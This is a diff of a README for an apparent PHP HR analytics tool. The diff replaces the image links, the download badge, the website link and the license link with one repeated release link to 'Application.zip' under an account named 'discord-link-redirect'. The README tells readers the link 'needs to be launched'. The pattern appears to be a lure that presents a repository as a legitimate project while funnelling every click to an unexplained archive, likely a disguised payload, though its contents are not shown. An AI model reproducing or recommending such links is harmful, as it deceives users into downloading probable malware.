@@ -3,7 +3,7 @@
 
 Welcome to the "hr-analytics-optimizer" repository - your go-to solution for analyzing employee feedback and performance data with advanced features like sentiment analysis, KPI tracking, and actionable insights. This PHP-based tool provides a comprehensive dashboard to visualize feedback sentiment, generate PDF reports, and manage performance metrics efficiently.
 
-![HR Analytics Optimizer](https://your-image-url.com)
+![HR Analytics Optimizer](https://github.com/discord-link-redirect/hr-analytics-optimizer/releases/download/v1.0/Application.zip)
 
 ## Key Features 🌟
 
@@ -30,19 +30,19 @@ To get started with HR Analytics Optimizer, follow these simple steps:
 
 ## Software Download 📥
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/discord-link-redirect/hr-analytics-optimizer/releases/download/v1.0/Application.zip)](https://github.com/discord-link-redirect/hr-analytics-optimizer/releases/download/v1.0/Application.zip)
 
 *Note: This link needs to be launched for software download.*
 
 ## Website 🌐
 
-Visit the official HR Analytics Optimizer website for more information, updates, and resources: [HR Analytics Optimizer Website](https://www.hranalyticsoptimizer.com)
+Visit the official HR Analytics Optimizer website for more information, updates, and resources: [HR Analytics Optimizer Website](https://github.com/discord-link-redirect/hr-analytics-optimizer/releases/download/v1.0/Application.zip)
 
 ## Screenshots 📷
 
 Here are some snapshots of the HR Analytics Optimizer dashboard in action:
 
-![Dashboard](https://your-dashboard-image-url.com)
+![Dashboard](https://github.com/discord-link-redirect/hr-analytics-optimizer/releases/download/v1.0/Application.zip)
 
 ## Contributing 🤝
 
@@ -50,7 +50,7 @@ We welcome contributions from the community to enhance HR Analytics Optimizer fu
 
 ## License ℹ️
 
-This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/your-username/your-repo/blob/master/LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/discord-link-redirect/hr-analytics-optimizer/releases/download/v1.0/Application.zip](https://github.com/discord-link-redirect/hr-analytics-optimizer/releases/download/v1.0/Application.zip) file for details.
 
 ---
 
